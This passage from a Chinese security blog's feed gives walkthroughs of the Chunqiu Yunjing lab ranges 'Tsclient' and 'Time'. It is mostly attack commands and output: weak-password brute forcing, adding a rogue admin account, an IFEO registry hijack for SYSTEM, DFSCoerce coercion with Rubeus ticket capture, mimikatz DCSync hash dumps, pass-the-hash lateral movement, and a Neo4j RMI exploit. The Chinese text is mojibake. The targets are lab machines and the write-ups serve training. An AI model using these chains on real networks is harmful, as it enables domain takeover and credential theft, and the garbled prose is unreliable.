[-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 </span><br><span class="line">[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜</span><br><span class="line">[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºæ¥è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œæœ‰äº†ä¹‹å‰çš„ç»éªŒï¼ŒçŸ¥é“è¦æ”¹å¯†ç äº†</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> rdesktop <span class="number">172.22.4.45</span></span><br></pre></td></tr></table></figure><p>æ”¹å®Œå¯†ç rdpä¸Šå»ï¼Œåœ¨æ¡Œé¢ä¸Šå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªé£é™©æ–‡ä»¶</p><p><img src="../ç¬”è®°å›¾/image-20240821004611448.png" alt="image-20240821004611448"></p><p>å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨</p><p><img src="../ç¬”è®°å›¾/image-20240821004914275.png" alt="image-20240821004914275"></p><p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œç„¶åcmdå¯åŠ¨è¿›ç¨‹ï¼Œæ³¨æ„è¿™ä¸ªæ‰§è¡Œæ˜¯æœ‰æ—¶é—´é™åˆ¶çš„ï¼Œæ¯”å¦‚ä½ æ‰§è¡Œä¸€ä¸ªshellï¼Œä»–åªæœ‰30ç§’çš„æ—¶é—´é™åˆ¶ï¼Œè¿‡äº†è¿™ä¸ªæ—¶é—´è¿›ç¨‹ä¹Ÿæ²¡äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p>æ­£å‘è¿æ¥ä¸Šçº¿æ‹¿åˆ°flag</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">c</span>:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240821011451547.png" alt="image-20240821011451547"></p><p>å‘ç°æœ‰WIN19ï¼Œå¹¶ä¸”æˆ‘ä»¬æ§åˆ¶çš„æ­£å¥½æ˜¯WIN19ï¼Œä¸”æœ‰systemæƒé™ï¼Œé‚£ä¹ˆåé¢çš„å°±å¾ˆæ˜ç¡®äº†ï¼Œå…ˆè®©WIN19ç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:2 /filteruser:DC01$ &gt;hash.txt</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¼ºè®¤è¯æ¼æ´å¼ºåˆ¶DCè®¿é—®WIN19ï¼Œæ‹¿åˆ°å…¶TGTç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dfscoerce.py -u <span class="string">&quot;WIN19$&quot;</span> -hashes :afd9423130654e89e67dc53032d26928 -d xiaorang.lab WIN19 172.22.4.7</span><br></pre></td></tr></table></figure><p>å¼ºåˆ¶è®¿é—®åhash.txté‡Œé¢å°±ä¼šå‡ºç°b64çš„TGTç¥¨æ®ï¼Œç„¶åå¯¼å…¥ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6KgcRtvscd/DIgXDFIVpBECG+5SBjjdmbEiHmHjAJVi3ZBX6mnDPpfPn5NDZGVO4j0vABRg+aa5U7ZbjceUVDzK24UQK5nE7WJ1YVLHyooOPxpWC2IOAfOGBPmle7HK5JNcyaCaTdASEK04nBwQv1UamoxWNQfOVAZcNKDt3Npg3OOAhHU0HyCdQQXFZkJWs6EnPHGtUm3YGn4rx5NkvjQjCgp2fodDeOyF/cRo4e63hdNA5qvysONb8OnmFdRe0OaH4o4zDNv+aD6Yl45eoAXLLFGe6R3W+9HJetYk/qnQx/GGXPpzhePf24J1xOLWPk3Wv350/AgNYO+/tMU3eGRyfW6sFHOGhZNlWCO5vGgmF9WlGz46+pvZjrFIfMvJ3wQ9U1cUUg9uACgTwARbhNywCWoZg9K7osCmwHM0oKHThVdei1IFPjmRsXBJqMiuhxEcTifAYybrROfvBtA+HPlArE7GFMi6/0EDqzUPEikaUMYuVhGCaG3+S1QeUlNz7T6BML/X7KKQbQUuCjaKy2tFffjetr/41pDQByHT/7hIzNenwrBlwiSiXlF5sPiAq6tVajRmfHpKlTdS9LIygbMaKPSCweJtMrTZVFAOmsyRnWcFgPNacxeCX2htGGdXbA2YNj4rO+kgLWgXz/M0PPMN8GmX5NivuTxXoCmDzarauwrIKFtmFcpAQ/P6L8JP++B3RqyVV2GN9XUXEq6Muf7riTI+IoySRXvqD5pnp0HcHEoeaKjUq24rUbBWTTMQ1SDMaBaKY3rcy79zyKDeYI2v2vhMjRF8lvtNUgW7ix99t0rSCwCSRIwE8mPt3dQAF35HPvMvs0zq253bij2gixCKBLLCHQJHmexBDgggt+GoZwicEUf/QiyZG96YijlyG+odyOCCZ0D927JUpsLK65bhN2IV0oNd3sfjbgwI0ugXfFzTkzrn+qlzd93mW84KeUut5bqsKuc90ymkIqqF9iTGJSlwDqWXOTWOwttcw+/IiMoGJSEctdjZ+6WWSjkhXtXLp5R7QAOJ3zIKyDwnzbCtKmXOAY/tHaUoHHPkEPvWciaf9p1Ap1MKfEGUmp9JsJbveQLfS0SR1hh0xgtDZG6MeMmq1hKGj5V/aeKy5+O4xpJpmrHRTExuJ++aNQbzEQS4xL/cMvRBLwWkLetJRQ3OKr60hPcQPZw43ZTMvAQZc53fGy6aYUSXKD5A6cMEbcEli3QAOl5f8dHm7L40cHcNW2J/nnvcOEdG5cYpg8h7366INTtQeia+gTsI8lFpIuIq6aZkerV3NqX7MD2YHQAD4njpw7Ijhj4wA+3mBCjTOPFRHQI7NwUeLTOw7fEEtK6pT0IsIph6vaEBxQv5H4moKweE2r6eELrooOR8YcxrVA025bSoGH1fxT0nYev5AcYWy+YiM/KAuW80uh2uX8uE7Dwx5GnskjzLUds0iCjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA7fqNz2H6UReJNgOy2IsNEDG9lAJebzDkz3AJrUqSrm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDgyMDE2MDIwMVqmERgPMjAyNDA4MjEwMjAyMDFapxEYDzIwMjQwODI3MTYwMjAxWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p>dumpå“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   79a05cdbf202947eeb0e56e4f93a806e        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     5f0f887110fb5c4fd14d34297e8d1dfd        4096</span><br><span class="line">1104    WIN19$  afd9423130654e89e67dc53032d26928        528384</span><br></pre></td></tr></table></figure><p>æ¨ªå‘19</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.19 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.7 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Tsclient</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Tsclient.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Tsclient.html</id>
    <published>2024-08-20T15:24:55.107Z</published>
    <updated>2024-08-20T15:35:43.145Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Tsclient</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.101.143.29:80 open</span><br><span class="line">39.101.143.29:1433 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.143.29      code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 39.101.143.29:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>mssqlå¼±å£ä»¤æ¼æ´ï¼ŒMDUTç›´æ¥æ‰“ï¼Œæ¿€æ´»ç»„ä»¶ååœŸè±†ææƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820163558842.png" alt="image-20240820163558842"></p><p>å¯ä»¥åŠ ä¸ªç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ­å»ºä»£ç†æ‰«å†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">fscan322.exe -h 172.22.8.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:2076:31a7:d89a:70e2</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥æ‰“çš„æœåŠ¡ï¼Œå›åˆ°å…¥å£æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user     <span class="comment">#æŸ¥çœ‹å½“å‰æœºå™¨ç”¨æˆ·</span></span><br><span class="line">quser || qwinst    <span class="comment">#æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å                ä¼šè¯å             ID  çŠ¶æ€    ç©ºé—²æ—¶é—´   ç™»å½•æ—¶é—´</span><br><span class="line">john                  rdp-tcp<span class="comment">#0           2  è¿è¡Œä¸­         17  2024/8/20 16:32</span></span><br><span class="line">chu0                  rdp-tcp<span class="comment">#2           3  è¿è¡Œä¸­          3  2024/8/20 16:40</span></span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨johnç”¨æˆ·ï¼Œç”¨systemæƒé™ä¸Šçº¿CSï¼Œè¿›ç¨‹æ³¨å…¥johnç”¨æˆ·ä¸Šçº¿ï¼ŒæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„æœåŠ¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820165500146.png" alt="image-20240820165500146"></p><p>ç›´æ¥é€šè®¯ä¸€ä¸‹çœ‹çœ‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820165533174.png" alt="image-20240820165533174"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¥—è´¦å·å¯†ç ï¼Œä¸è¿‡å¥½åƒæ²¡æœ‰flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æ‹¿ç€è´¦å·å¯†ç å»çˆ†ä¸€ä¸‹å§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.1/24 -u Aldrich -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> -d xiaorang.lab 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820170747006.png" alt="image-20240820170747006"></p><p>å°è¯•ç™»å½•31ï¼Œæç¤ºå¯†ç è¿‡æœŸï¼Œæ‰€ä»¥æ¢ä¸ªæ–¹å¼ç™»å½•ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹å¯†ç å†ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4  rdesktop 172.22.8.31</span><br></pre></td></tr></table></figure><p>å¯†ç ä¿®æ”¹æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ç™»å½•ï¼Œæ¥ç€ç™»46</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4  rdesktop 172.22.8.46</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç™»å½•ï¼Œåé¢è¿˜æ˜¯ç”¨winçš„rdpæ–¹ä¾¿ï¼Œbloodhoundæ”¶é›†ä¸€ä¸‹ä¿¡æ¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820172331721.png" alt="image-20240820172331721"></p><p>å‘ç°WIN2016ä¸ºåŸŸç®¡ç”¨æˆ·ï¼Œåé¢å°±è¦ç”¨WIN2016å»dumpåŸŸç®¡å“ˆå¸Œäº†ï¼Œæ‰€ä»¥ç°åœ¨å°±éœ€è¦ææƒäº†ï¼Œåé¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820172526252.png" alt="image-20240820172526252"></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°æ‰€æœ‰æ­£å¸¸ç™»å½•çš„ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œä¿®æ”¹æ³¨å†Œè¡¨æ˜ åƒåŠ«æŒï¼Œä½¿ç”¨æ”¾å¤§é•œè¿›è¡Œææƒï¼Œå…¶å®ä¹Ÿå°±æ˜¯æŠŠæœ¬æ¥ç”¨æˆ·ä¸»é¡µç‚¹æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\windows\system32\cmd.exeï¼Œè¿™æ ·å°±ç›´æ¥ææƒæˆsystemäº†ï¼Œå…ˆæŠŠshellå’Œmimikatzä¼ ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><p>å°†å±å¹•é”å®šï¼Œç„¶åæ‰“å¼€æ”¾å¤§é•œå°±æ˜¯systemæƒé™ç»ˆç«¯äº†ï¼Œå¯ä»¥åˆ©ç”¨csåšè½¬å‘ä¸Šçº¿ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯æŠ“å–å“ˆå¸Œï¼Œå…ˆæ‹¿ä¸ªflagç„¶åæ‹¿å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514</span><br><span class="line">1000    DC01$   d61a2af9b1ab466717017651fd1c781b        532480</span><br><span class="line">500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512</span><br><span class="line">1103    WIN2016$        3505cfb2a6769aff4c8cd85687257d29        16781312</span><br><span class="line">1104    WIN19-CLIENT$   17258d4f49268599b4ff63c40d5b95a2        16781312</span><br><span class="line">1105    Aldrich baef402f3580fe1c75dfceaef4ae419f        512</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯ç»å…¸çš„æ¨ªå‘äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Time</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Time.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Time.html</id>
    <published>2024-08-20T15:24:07.837Z</published>
    <updated>2024-08-20T15:35:36.444Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Time</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">39.99.255.178:1337 open</span><br><span class="line">39.99.255.178:7473 open</span><br><span class="line">39.99.255.178:7474 open</span><br><span class="line">39.99.255.178:7687 open</span><br><span class="line">39.99.255.178:39773 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">å·²å®Œæˆ 0/5 [-] webtitle https://39.99.255.178:1337 Get <span class="string">&quot;https://39.99.255.178:1337&quot;</span>: EOF</span><br><span class="line">[*] WebTitle: http://39.99.255.178:7474 code:303 len:0      title:None è·³è½¬url: http://39.99.255.178:7474/browser/</span><br><span class="line">[*] WebTitle: http://39.99.255.178:7474/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7473 code:303 len:0      title:None è·³è½¬url: https://39.99.255.178:7473/browser/</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7687 code:400 len:50     title:None</span><br><span class="line">[*] WebTitle: https://39.99.255.178:7473/browser/ code:200 len:3279   title:Neo4j Browser</span><br></pre></td></tr></table></figure><p>å‘ç°neo4jï¼Œä½¿ç”¨CVE-2021-34371æ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget.jar rmi://39.98.110.107:1337 <span class="string">&quot;touch /tmp/123&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/neo4j/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«æå†…ç½‘ï¼Œæ­å»ºä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe05:e4f7  prefixlen 64  scopeid 